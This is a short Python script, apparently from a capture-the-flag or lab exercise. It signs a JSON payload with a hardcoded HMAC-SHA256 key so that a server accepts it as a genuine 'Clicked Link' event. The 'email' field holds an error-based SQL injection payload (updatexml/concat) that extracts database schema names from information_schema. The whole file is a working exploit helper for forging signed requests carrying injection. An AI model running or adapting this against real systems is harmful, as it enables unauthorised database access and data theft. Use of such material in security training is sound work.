#!/usr/bin/python3
import hmac, json, hashlib

def main():
    data = {
        "campaign_id": 1,
        "email":  "\" OR updatexml(1, concat(0x7e, (SELECT schema_name FROMinformation_schema.schemata WHERE schema_name NOT LIKE \"information_schema\" LIMIT 1,1),0x7e), 1) ;",
        "message": "Clicked Link"
    }

    print(hmac.new("3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS".encode(), json.dumps(data, separators=(',',':')).encode(), hashlib.sha256).hexdigest())

if __name__ == '__main__':
    main()
